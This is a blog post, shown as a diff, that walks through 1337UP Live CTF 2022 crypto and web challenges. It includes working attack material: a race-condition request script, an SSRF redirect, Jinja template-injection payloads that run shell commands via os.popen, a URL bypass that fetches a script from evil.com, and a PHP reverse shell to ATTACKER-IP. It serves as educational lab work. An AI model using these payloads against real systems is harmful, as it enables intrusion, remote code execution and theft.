@@ -1,0 +1,808 @@
+---
+layout: post
+title:  "1337UP Live CTF 2022 Writeup"
+tags: CTF
+---
+
+- Crypto
+  - Binomial Ways
+  - Equality
+- Web
+  - Quiz
+  - Dead Tube
+  - 1 truth, 2 lies
+- Lovely Kitten Pictures
+  - Part 1
+  - Part 2
+  - Part 3
+- Conclusion
+- Lessons Learned
+{:toc}
+
+&nbsp;
+
+
+## **Crypto**
+
+### **Binomial Ways**
+
+>There is only one way! The binomial way!
+>Created by Shyam Sunder Saravanan
+
+For the first challenge, let's start with some crypto. In this challenge we are
+given a script and its output. First, the script.
+
+```python
+from secret import flag
+val = []
+flag_length = len(flag)
+print(flag_length)
+
+def factorial(n):
+    f = 1
+    for i in range(2, n+1):
+        f *= i
+    return f
+
+def series(A, X, n):
+    nFact = factorial(n)
+    for i in range(0, n + 1):
+        niFact = factorial(n - i)
+        iFact = factorial(i)
+        aPow = pow(A, n - i)
+        xPow = pow(X, i)
+        val.append(int((nFact * aPow * xPow) / (niFact * iFact)))
+
+A = 1; X = 1; n = 30
+series(A, X, n)
+ct = []
+for i in range(len(flag)):
+    ct.append(chr(ord(flag[i])+val[i]%26))
+print(''.join(ct))
+```
+
+The script looks like it does some cheeky math to create a list of values. These
+values are used to adjust the corresponding flag byte. The each value mod 26 is
+added to said flag byte and the final value is casted to a new character. The output for
+the program is provided and looks something like the following:
+
+>31
+>27F;VPbAs>clu}={9ln=_o1{0n5tp~
+
+The first line of the output is the flag length and the rest is our ciphertext.
+The encoding process looks fairly tricky at a glance, but, we don't actually need
+to analyze it too much. The script shows that the `val` list is based entirely on
+the constants A, X, n. Therefore, `val` never changes unless we edit those values.
+This reduces our problem to just reversing the last step of the encoding. Reversing the
+encoding is fairly simple too!
+
+```python
+ct.append(chr(ord(ct[i])-val[i]%26))
+```
+
+We can easily reverse the shift by subtracting the value mod 26 from the ciphertext character.
+From here a simple adjustment to the encoding script can be created to decode the ciphertext.
+
+```python
+val = []
+cipher = '27F;VPbAs>clu}={9ln=_o1{0n5tp~'
+cipher2 = 'a27F;VPbAs>clu}={9ln=_o1{0n5tp~'
+
+...
+
+A = 1; X = 1; n = 30
+series(A, X, n)
+result = ''
+result2 = ''
+
+for i in range(len(cipher)):
+    result += chr(ord(cipher[i])-val[i]%26)
+
+for i in range(len(cipher2)):
+    result2 += chr(ord(cipher2[i])-val[i]%26)
+
+print(result)
+print(result2)
+```
+
+Notice, however, that there is a little quirk with the flag in this case. The ciphertext
+we received is only 30 characters long, which contradicts the other part of the output
+which said the flag was 31 characters long. This causes flag retrieval to take an extra step.
+The first ciphertext can be decoded for the first half of the flag, then another
+ciphertext with a single character prepended to it can be decoded for the second half of the flag.
+Therefore, the script outputs the following:
+
+>1337UPUAf>Vlh{(o$ja=Ro${#n4p]z
+>`.$B:VCb4s1c_sh1f7_n0_b1n0m1al}
+
+>1337UP{b4s1c_sh1f7_n0_b1n0m1al}
+
+&nbsp;
+
+### **Equality**
+
+>Perfectly balanced, as all things should be!
+>Created by Piyush Paliwal
+
+For Equality, we are given two sets of RSA values and are tasked with decoding the
+flag they represent. Here are the values
+
+>n1=0xa6241c28743fbbe4f2f67cee7121497f622fd81947af30f327fb028445b39c2d517ba7fdcb5f6ac9e6217205f8ec9576bdec7a0faef221c29291c784eed393cd95eb0d358d2a1a35
+>dbff05d6fa0cc597f672dcfbeecbb14bd1462cb6ba4f465f30f22e595c36e6282c3e426831d30f0479ee18b870ab658a54571774d25d6875
+>e1=0x3045
+>c1=0x5d1e39bc751108ec0a1397d79e63c013d238915d13380ae649e84d7d85ebcffbbc35ebb18d2218ccbc5409290dfa8a4847e5923c3420e83b1a9d7aa67190dc0d34711cce261665c6
+>4c28ed2834394d4b181926febf7eb685f9ce81f36c7fb72798da3a14a123287171d26e084948aab0fba81c53f10b5696fc291006254ee690
+>
+>n2=0xa6241c28743fbbe4f2f67cee7121497f622fd81947af30f327fb028445b39c2d517ba7fdcb5f6ac9e6217205f8ec9576bdec7a0faef221c29291c784eed393cd95eb0d358d2a1a35
+>dbff05d6fa0cc597f672dcfbeecbb14bd1462cb6ba4f465f30f22e595c36e6282c3e426831d30f0479ee18b870ab658a54571774d25d6875
+>e2=0xff4d
+>c2=0x3d90f2bec4fe02d8ce4cece3ddb6baed99337f7e6856eef255445741b5cfe378390f058679d70236e51be4746db4c207f274c40b092e24f8c155a0957867e84dca48e27980af488d
+>2615a280c6eadec2f1d30b95653b1ee3135e2edff100dd2c529994f846722f811348b082d0bec7cfab579a4bd0ab789928b1bebed68d628f
+
+If you look closely, you can see a major red flag with these numbers. Both n values are the same.
+Assuming both ciphertexts have the same plaintext, this opens the door for a possible Common Modulus attack.
+
+![RSA Equations](/assets/1337UPCTF/math.png)
+
+This gives us equations **1**, **2**, but this attack also requires condition **3** to work.
+Given that `gcd(e1, e2) = 1`, we can develop that there is a and b such that
+
+![Math it out](/assets/1337UPCTF/math2.PNG)
+
+We can then decode the plaintext as the following:
+
+![Math again](/assets/1337UPCTF/math3.png)
+
+The trick is somehow finding a and b values that solve the equation. For that we use the
+extended Euclidean algorithm (which I sort of already showed earlier). We can calculate a
+and then b as
+
+![Final math?](/assets/1337UPCTF/math4.png)
+
+And from there we can use the a and b values to recover the plaintext. There is a bit of
+a complication with b always being a negative. But, we can fix this by taking the modular
+inverse of `c2` and then substituting it into equation **5**.
+
+![Seriously Final Math](/assets/1337UPCTF/math5.png)
+
+Naturally, this is a bit of math coding. So, the best way to solve this is using a script from github.
+This specific one can be found [here](https://github.com/a0xnirudh/Exploits-and-Scripts/blob/master/RSA%20Attacks/RSA:%20Common%20modulus%20attack.py).
+We just have to plug in our modulus, e-values, and c-values and the script will decrypt
+the ciphertext if possible. After running the script we get the following output:
+
+>Plain Text:  1337UP{c0mm0n_m0dulu5_4774ck_15_n07_50_c0mm0n}
+
+&nbsp;
+
+## **Web**
+
+### **Quiz**
+
+>Ready for a little quiz?
+>Created by Bruno Halltari and GoatSniff
+
+[![Quiz](/assets/1337UPCTF/quiz2.png)](/assets/1337UPCTF/quiz2.png)
+
+For this challenge we are given a quiz about the 1337UP Live events. The quiz takes the
+form of a web app, each answer we get right is worth 10 points and with 100 points we can
+buy the flag. However, there are only 3 questions so we are gonna need to figure out something else.
+
+A quick search through the webpage source reveals some javascript for us to examine.
+
+```javascript
+function setMessage(message) {
+    document.querySelector('#message').innerText = message;
+}
+
+function setPoints(n) {
+    document.querySelector('#points').innerText = `Your Points: ${n}`;
+}
+async function resetPoints() {
+    const msg = await (await fetch("/reset", {
+        method: 'POST'
+    })).text();
+    ["q1", "q2", "q3"].forEach(q => setButtonStyle(q, "primary"));
+    setMessage(msg);
+    setPoints(0);
+};
+async function buyFlag() {
+    const msg = await (await fetch("/buyFlag")).text();
+    setMessage(msg);
+}
+async function submitAnswer(qNum) {
+    const answer = document.querySelector(`input[name="answer${qNum}"]:checked`).value;
+    const msg = await (await fetch("/submitAnswer", {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            questionNumber: qNum,
+            answer: answer
+        })
+    })).text();
+    if (msg == "Incorrect answer!") {
+        setButtonStyle(`q${qNum}`, "error");
+    } else if (msg == "Correct answer! +10 points!") {
+        setButtonStyle(`q${qNum}`, "success");
+    }
+    refreshPoints();
+    setMessage(msg);
+}
+
+async function setButtonStyle(qNum, state) {
+    const btn = document.querySelector(`#${qNum}btn`);
+    if (!btn) return;
+    if (state == "primary") {
+        btn.className = "nes-btn is-primary";
+        btn.innerHTML = 'Submit';
+    }
+    if (state == "success") {
+        btn.className = "nes-btn is-success";
+        btn.innerHTML = '<i class="nes-icon is-small star"></i> Correct!';
+    }
+    // Don't change from success
+    if (state == "error" && !btn.classList.contains("is-success")) {
+        btn.className = "nes-btn is-error";
+        btn.innerHTML = '<i class="nes-icon close is-small"></i> Submit';
+    }
+
+}
+
+// Ask the server for the user's status and refresh the points
+async function refreshPoints() {
+    const res = await fetch("/user");
+    const user = await res.json();
+    setPoints(user.points);
+}
+```
+
+The chunk of javascript we find describes how to client sends and receives quiz data.
+We can see several of the main functions of the quiz:
+
+- Sending answers
+- Resetting points
+- Buying the flag
+
+Unfortunately, from here it doesn't look like we can forge any data to trick the server.
+However, there might be some sort of a race condition when sending answers to the server.
+In the source, there is a small time gap between the user sending the answers and the server
+confirming the user's point total in `refreshPoints()`. There also doesn't seem to be
+(on the client side at least) anyway to prevent duplicate answer submissions.
+
+So, the main idea here is to send a bunch of submissions to the server and hope they
+all arrive before our point total can be locked-in. By the end we will hopefully have
+enough points to buy the flag.
+
+At the time of the competition, it was easily doable to just click the submit button
+real fast to trigger the race condition. However, that isn't very cool or "hackery".
+So instead, I created a scripts to perform the attack.
+
+```python
+import grequests
+import requests
+
+answer_url = 'https://quiz.ctf.intigriti.io/submitAnswer'
+user_url = 'https://quiz.ctf.intigriti.io/user'
+
+payload = {'questionNumber':1, 'answer':'monthly'}
+
+cookies = {'connect.sid':'cookie goes here',
+           'INGRESSCOOKIE':'the other cookie goes here'}
+
+
+def race(x):
+    results = grequests.map(grequests.post(answer_url, cookies=cookies, json=payload) for _ in range(x))
+    res = requests.get(user_url, cookies=cookies)
+    return results, res
+
+
+print(race(20))
+```
+
+The script uses grequests to send asynchronous post requests to the server. If you want to
+try it out yourself you just have to substitute in your own cookies (assuming the challenge is still up of course).
+Once the script finishes we can refresh the page and check if we have enough points. If we do,
+we can buy the flag and complete the challenge. If not, we reset our points and try again.
+
+[![Racer Flag](/assets/1337UPCTF/quizflag.png)](/assets/1337UPCTF/quizflag.png)
+
+>1337UP{this_is_a_secret_flag}
+
+&nbsp;
+
+### **Dead Tube**
+
+>The new video service coming to you: Dead Tube
+>Created by Bruno Halltari
+
+[![Dead Tube](/assets/1337UPCTF/dead1.png)](/assets/1337UPCTF/dead1.png)
+
+Dead Tube is a web challenge based on a web service that previews URLs that
+we submit. For this challenge we are provided a zip file containing the source code
+for the application; let's take a look at the code.
+
+```javascript
+app.post("/preview", async (req, res) => {
+    const { link } = req.body;
+    if(!link || typeof link !== "string") {
+        return res.send("Missing link");
+    }
+
+    let url;
+    try {
+        url = new URL(link);
+    }
+    catch(err) {
+        return res.send("Invalid url");
+    }
+
+    if(!["http:", "https:"].includes(url.protocol)) {
+        return res.send("Invalid url");
+    }
+
+    let dnsLookup;
+    try {
+        dnsLookup = await dnsp.lookup(url.hostname, 4);
+    }
+    catch(err) {
+        return res.send("Could not resolve url");
+    }
+
+    console.log(dnsLookup);
+    let { address } = dnsLookup;
+    if(isIpPrivate(address)) {
+        return res.send("You are not allowed to view this url");
+    }
+
+    try {
+        let fetchReq = await fetch(link);
+        fetchReq.body.pipe(res);
+    }
+    catch(err) {
+        res.send("There was an error previewing your url");
+    }
+});
+
+app.get("/flag", (req, res) => {
+    console.log(req.socket.remoteAddress);
+    if(req.socket.remoteAddress === "::ffff:127.0.0.1") {
+        return res.send(process.env.FLAG || "flag{test_flag}");
+    }
+    res.send("No flag for you!");
+});
+
+app.listen(PORT, () => console.log(`app listening on port ${PORT}`));
+```
+
+The script we are given reveals our goal for this challenge, access the /flag page.
+Using the functionality of the page, we should be able to perform an SSRF attack and
+preview the flag. However, the script has some protections. First, the app confirms we
+are supplying an http or https URL, preventing us from using another protocol. Second,
+a DNS lookup is performed on the URL to ensure it doesn't resolve to a private address
+like localhost.
+
+Luckily, after these security measures, we still seem to have an option. An HTTP redirect
+to localhost. If we set up the following PHP code on a domain we control, we can still
+get access to the flag page.
+
+```
+<?php
+header('Location: http://127.0.0.1:8080/flag');
+?>
+```
+
+Since the URL resolves to another domain, the DNS lookup will not read a
+private IP address. But, then the PHP code at our controlled domain will trigger a redirect
+to the private IP we want to access. Therefore, the final result is a clear viewing of
+the secret flag section of the website.
+
+>1337UP{SSRF_AINT_GOT_NOTHING_ON_M3}
+
+&nbsp;
+
+### **1 truth, 2 lies**
+
+>This is a lie!
+>Created by ComdeyOverflow
+
+The basic premise of this challenge is determining which sections of code are
+actually vulnerable. We are given some source code for the site but I will omit
+most of it as it is fairly ugly looking (at some points). Here are the important
+excerpts
+
+```python
+def WH4TSGO1NG0N():
+    BRRRRR_RUNNING = request.args.get('input', None)
+    if BRRRRR_RUNNING is None:
+        return 'BRRRRR_RUNNING'
+    else:
+        return 'Your input: {}'.format(BRRRRR_RUNNING)
+
+```
+
+```python
+def WH4TSG01NG0N():
+    BRRRRR_RUNNING = request.args.get("input", None)
+    if BRRRRR_RUNNING is None:
+        return "BRRRRR_RUNNING"
+    else:
+        for _ in BRRRRR_RUNNING:
+            if any(x in BRRRRR_RUNNING for x in {'.', '_', '|join', '[', ']', 'mro', 'base'}):
+                return "caught"
+            else:
+                return render_template_string("Your input: " + BRRRRR_RUNNING)
+```
+
+```python
+def WH4T5GO1NG0N():
+    BRRRRR_RUNNING = request.args.get("input", None)
+    if BRRRRR_RUNNING is None:
+        return "BRRRRR_RUNNING"
+    if "{{" and "}}" in BRRRRR_RUNNING:
+        return "BRRRRR_RUNNING"
+    else:
+        return "Your input: " + BRRRRR_RUNNING
+```
+
+Each segment has a URI that declares the following segment is vulnerable.
+So, given the challenge name, out of these 3 segments only one is actually vulnerable.
+The third segment seems unlikely as it blacklists all double curly braces.
+From a glance, the first segment could be vulnerable, but ultimately, isn't; it correctly
+creates a format string. Finally, given our previous experience with SSTI the second seems
+to the most likely.
+
+Taking a closer look at segment 2, let's try some template injections strings to test if
+we can create any strange output.
+
+[![7*7](/assets/1337UPCTF/1truth1.png)](/assets/1337UPCTF/1truth1.png)
+
+When we supply the classic `\{\{7*7\}\}` string to the app, it spits out a the tell-tale 49.
+So this segment is definitely injectable, but looking closer at it's code, it has a small
+blacklist that complicates things. The app blocks the use of any of the following:
+
+>'.', '_', '|join', '[', ']', 'mro', 'base'
+
+This makes things a fair bit more complicated. However, with a bit of googling we can
+find a decent bypass for most of these vulnerabilities. Since `attr` is not in the blacklist,
+we can easily bypass the first two filters and access the globals.
+
+>{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}
+
+Now we just need to use these to access some system commands. The easiest way to do this,
+in this case, we can work our way towards popen. Popen will let us create a process and
+read it's output for a lot of common system commands. First, to create a injection to
+list directory contents and get our bearings
+
+>{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
+
+
+[![Dir Contents](/assets/1337UPCTF/1truth2.png)](/assets/1337UPCTF/1truth2.png)
+
+Next, we just need to read the flag file and the challenge should be complete.
+
+>{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat%20flag*')|attr('read')()}}
+
+[![Flag](/assets/1337UPCTF/1truth3.png)](/assets/1337UPCTF/1truth3.png)
+
+>flag{lea5n_h0w_vuln_h1ppen_and_wh1t_line_m1ke_vuln!!!}
+
+&nbsp;
+
+## **Lovely Kitten Pictures**
+
+### **Part 1**
+
+>Come here little kitty cat!
+>Created by Breno Vitório
+
+Lovely Kitten Pictures is a big web challenge that is split into parts. It also changes
+environments as we go along, eventually becoming a linux privilege escalation challenge.
+
+To begin our foray into this lengthy web challenge, we start off with some basic, but,
+interesting tasks. Let's start off by exploring the site a bit.
+
+[![Site Main page](/assets/1337UPCTF/lovelycat.png)](/assets/1337UPCTF/lovelycat.png)
+
+The site is fairly simple from an initial look. Cute cat pictures are displayed and
+the user can swap between them by clicking a button. Nothing too exploitable. Perhaps
+there is more hidden in the page's source code.  
+
+```javascript
+let kitten = 0;
+
+changeKitten();
+
+function changeKitten() {
+    kitten = getRandomInt(1, 11, kitten);
+
+    fetch(`cat_info.php?id=${kitten}`)
+        .then(async (response) => {
+            let result = await response.json();
+            result = JSON.parse(result);
+
+            const pictureContainer = document.getElementById("picture-container");
+
+            const picture = pictureContainer.getElementsByTagName("img")[0];
+            picture.src = `pictures.php?path=${result.Picture}`;
+
+            picture.onload = (event) => {
+                event.target.style.boxShadow = "0px 0px 5px 5px rgba(0,0,0,0.2)";
+            };
+
+            const span = document.getElementsByTagName("span")[0];
+            span.innerText = result.Name;
+        });
+}
+
+function getRandomInt(min, max, except) {
+    min = Math.ceil(min);
+    max = Math.floor(max);
+
+    let result = Math.floor(Math.random() * (max - min)) + min;
+
+    while (result === except) {
+        result = Math.floor(Math.random() * (max - min)) + min;
+    }
+
+    return result;
+}
+```
+
+The source code reveals this chunk of javascript that the user runs in order to swap
+between cat pictures. Within the javascript, there are references to two PHP files:
+`cat_info.php` and `pictures.php`. Their functions seem fairly straightforward, get cat data
+and return the corresponding cat picture. The next question that should come to mind is
+"can we access these functions ourselves?". Let's try it out.
+
+>https://lovelykittenpictures.ctf.intigriti.io/cat_info.php?id=1
+
+When the above URL is visited we see the following output:
+
+>"{\"Picture\":\"assets\/1.jpg\",\"Name\":\"Louie\"}"
+
+It seems that cat_info.php is accessible and outputs cat data to us. Next, we can try
+messing with the id parameter a bit to try and get something other than cat data.
+
+>https://lovelykittenpictures.ctf.intigriti.io/cat_info.php?id=0
+>"Flag -c expected, but no value was given to it &#128008;"
+
+With `id=0` we get a strange error message. There isn't much to go on with this error but it
+might come in handy later. Next, we can try out pictures.php
+
+>https://lovelykittenpictures.ctf.intigriti.io/pictures.php?path=assets/1.jpg
+
+Using the data we gathered from cat_info.php we have a path to a cute cat `assets/1.jpg`.
+When we visit the above URL we get the following output:
+
+[![Cute Cat](/assets/1337UPCTF/lovelycat3.png)](/assets/1337UPCTF/lovelycat3.png)
+
+It's just a cute cat but, this means pictures.php is also easily accessible to us.
+Next, let's mess with this function as well and try to include something that isn't
+a cat path. How about the pictures script?
+
+>https://lovelykittenpictures.ctf.intigriti.io/pictures.php?path=pictures.php
+
+[![Download](/assets/1337UPCTF/lovelycatx.png)](/assets/1337UPCTF/lovelycatx.png)
+
+The website lets us download the pictures.php script but the name is a bit interesting.
+It appears to be the first flag of this challenge.
+
+>1337UP{K1TT3N_F1L3_R34D}
+
+&nbsp;
+
+### **Part 2**
+
+>In ancient times cats were worshipped as gods; they have not
+>forgotten this.
+>
+>Created by Breno Vitório
+
+As we saw in the previous part, we can now download some important files. Let's start
+with an easy one: pictures.php
+
+```
+<?php
+    $projectRoot = realpath(__DIR__);
+
+    $relativePath = $_GET['path'];
+    $absolutePath = realpath($projectRoot . "/" . $relativePath);
+
+    if ($absolutePath === false || strcmp($absolutePath, $projectRoot . DIRECTORY_SEPARATOR) < 0 || strpos($absolutePath, $projectRoot . DIRECTORY_SEPARATOR) !== 0) {
+        echo "Not yet!";
+        http_response_code(404);
+        die;
+    }
+
+    $splittedPath = explode('.', $relativePath);
+    $fileExtension = end($splittedPath);
+
+    if ($fileExtension === "jpg") {
+        header('Content-type: image/jpeg');
+        $pictureName = "photo";
+
+    } else {
+        header('Content-type: image/'.$fileExtension);
+        $pictureName = file_get_contents("/flag1.txt");
+    }
+
+    header("Content-Disposition: filename=$pictureName-file.$fileExtension");
+    header('Content-Transfer-Encoding: binary');
+    header('Expires: 0');
+    header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
+    readfile($relativePath);
+    die;
+?>
+```
+
+pictures.php doesn't contain anything more than we already know. Next,
+we can view the contents of cat_info.php
+
+```
+<?php    
+    $kittenID = $_GET['id'];
+    $cmd = escapeshellcmd("/var/www/html/cat_info/main -c $kittenID");
+    $output = shell_exec($cmd);
+
+    if(sizeof(explode(" ", $kittenID)) === 1) {
+        header('Content-type: application/json'); /* So it only returns as JSON when there is
+                                                     no space character? */
+        echo json_encode($output);
+        die;
+    }
+
+    echo "<pre>".$output."</pre>";
+?>
+```
+
+cat_info.php is a bit more enlightening. It reveals the presence of a `main` program
+that takes a flag `-c`. This brings a bit more light to the previous part when we found
+that weird error. So let's also try to download main.
+
+Unfortunately, main is compiled c so we have to work a bit harder to get any new info.
+There are a couple of ways to go from here. We could use strings to look for hints or
+decompile the program to find hints. I chose to decompile it to see the logic a tiny bit better.
+Either way works just fine though.
+
+[![Main](/assets/1337UPCTF/lovelykitten1.png)](/assets/1337UPCTF/lovelykitten1.png)
+
+There are a few strings in main that reveal the flags the program takes. `-c` we have already
+seen but `-h` can also be used to get some help info. Let's see if it works on the site.
+
+>https://lovelykittenpictures.ctf.intigriti.io/cat_info.php?id=1%20-h
+
+[![Cat Help](/assets/1337UPCTF/lovelycats.png)](/assets/1337UPCTF/lovelycats.png)
+
+The site responds with the help info for main and gives us more insight into the program flags.
+`-e` is an extremely interesting flag to try out. When `-e` is enabled the program can "perform
+a health check" by querying a URL. The example mentions another interesting file that we should
+probably download - pictures.sh. Here is the script in question
+
+```bash
+#!/bin/bash
+
+printf "–––––––– Pictures Health Check ––––––––\n\n"
+
+for kitten in $(seq 1 10); do
+    printf "Testing Kitten $kitten: "
+
+    wget -q --spider "http://localhost/assets/$kitten.jpg"
+
+    if [[ $? == 0 ]]
+    then
+        printf "OK!\n\n"    
+    else
+        printf "Not OK!\n\n"
+    fi
+done
+
+printf "––––––––––––– Tests done –––––––––––––\n\n"
+```
+
+For once, it's nothing that interesting, just cool to find. Anyway, let's try to mess with main
+a bit. Given that the `-e` flag takes in a URL, we can potentially try to direct the program
+to a remote URL hosting our own script.
+
+>https://lovelykittenpictures.ctf.intigriti.io/cat_info.php?id=1%20-e%20http://evil.com/script.sh
+>[*] External requests are not allowed! 🐈
+
+Unfortunately, like the help menu said, requests to external domains are not allowed. Or are they?
+Perhaps we just need to trick the application into thinking it's a request to localhost.
+A common technique to try is using something like `localhost@evil.com/`. Sometimes, this is
+enough to trick the application but still have the URL resolve to `evil.com`. Here,
+localhost is treated as a username for the evil.com domain.
+
+>https://lovelykittenpictures.ctf.intigriti.io/cat_info.php?id=1%20-e%20http://localhost@evil.com/script.sh
+>[*] Showing results 🐈
+
+Nice! The bypass works! Now we just need to host a script to run on our domain evil.com. First, I chose to
+make a script to read the contents of a directory.
+
+```bash
+#!/bin/bash
+
+search_dir=/
+
+for entry in "$search_dir"/*
+do
+  echo "$entry"
+done
+```
+
+[![Root Contents](/assets/1337UPCTF/lovelycats2.png)](/assets/1337UPCTF/lovelycats2.png)
+
+**Figure X** shows the results of our script and reveals the second flag's file.
+Now that we know where it is, we just have to read the flag. To do this I adjusted the
+script.
+
+```bash
+#!/bin/bash
+
+cat /flag2.txt
+```
+
+The new script is fairly low-tech but it gets the job done and outputs the new flag.
+
+>1337UP{K1TT3N_BYP4SS_W1TH_4T_CH4R4CT3R}
+
+As a side-note, we can use our directory printing script combined with our file
+download capabilities (or file read script) to view other interesting things on the server.
+One of which being a main.go file. I have included the file [here](/assets/1337UPCTF/main.go) for interest but
+reading it isn't required for the next part.
+
+&nbsp;
+
+### **Part 3**
+
+>A cat is an example of sophistication minus civilization.
+>Created by Breno Vitório
+
+The final part I completed starts right where we left off in part 2. After reading the second flag,
+the next logical step seems to point to getting shell access on the server. Getting a shell seems
+pretty straightforward, we just need to change our script from part 2 to include a reverse shell.
+We know that the server has to have PHP installed so PHP seems like a solid choice for a
+reverse shell.
+
+```bash
+#!/bin/bash
+
+php -r '$sock=fsockopen("ATTACKER-IP", 4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+Once we set up a listener on our machine and get the server to run our script,
+we receive our hard earned shell. Next, it's time to explore the machine a bit.
+Using `sudo -l` we can find that our current user (www-data) has permissions to
+`sudo su` as user "level1" without a password. A very simple privilege escalation but
+we take all the wins we can get.
+
+[![Flag](/assets/1337UPCTF/lovelycats4.png)](/assets/1337UPCTF/lovelycats4.png)
+
+After a bit more exploring with our new access, we can find the third flag inside the
+home directory for level1.
+
+>1337UP{SUP3R_34SY_K1TT3N_PR1V3SC}
+
+&nbsp;
+
+## **Conclusion**
+
+1337UP Live CTF was a primarily web focused CTF but also had a large variety of fun
+challenges. They also had a conference after the CTF with some cool speakers (the vod can be found [here](https://www.youtube.com/watch?v=oA5d8IYUUbc) if you're interested).
+Challenges like Lovely Kitten Pictures were a lot of fun and had great progression
+compared to similar challenges in other events. The huge amount of web challenges was frustrating
+only because there wasn't enough time to enjoy everything in this 24 hour CTF. Infrastructure did
+suffer a tiny bit at times but was otherwise manageable.
+
+Overall, another solid event this year and definitely another to look forward to next year.
+Thank you to all the organizers and challenge authors for your hard work on this fantastic event.
+
+&nbsp;
+
+## **Lessons Learned**
+
+1. Common Modulus Attack on RSA
+2. Race Conditions
+3. SSRF With PHP Redirect
+4. SSTI Filter Bypassing - Filtered Underscores and MRO
+5. Leveraging LFI to RCE
